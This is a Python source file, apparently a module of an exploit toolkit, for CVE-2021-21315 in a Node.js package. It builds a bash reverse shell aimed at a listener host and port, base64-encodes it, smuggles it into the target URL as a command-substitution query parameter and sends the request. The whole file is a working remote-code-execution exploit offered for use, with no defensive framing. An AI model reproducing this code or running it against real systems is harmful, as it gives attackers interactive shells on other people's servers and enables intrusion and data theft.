#! /usr/bin/python3
# -*- encoding: utf-8 -*-
from urllib.request import quote
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet
import requests
import base64
class Cve_2021_21315Nc:
    def __init__(self):
        self.header = None
        self.proxy = None

    def payload_wrapper(self,lhost, lport, url):
        Payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        Payload = base64.b64encode(Payload.encode()).decode()
        Payload = quote(f"$(echo '{Payload}' | base64 -d | bash)")

        url = url + f'[]={Payload}'
        return url

    def send_payload(self,url):
        OutPrintInfo("Node-JS", "Sending Payload ...")
        try:
            req = requests.get(url, timeout=3,verify=self.verify,proxies=self.proxy,headers=self.header)
        except:
            # TODO: Write a better exception Handler
            OutPrintInfo("Node-JS", "Check your listener")
            return
    def main(self,target):
        url = target[0].strip('/ ')
        proxy = target[1]
        header = target[2]
        lhost = target[3]
        lport = target[4]
        self.verify = target[5]
        reqset = ReqSet(proxy=proxy,header=header)
        self.proxy = reqset["proxy"]
        self.header = reqset["header"]
        self.send_payload(self.payload_wrapper(lhost, lport, url))
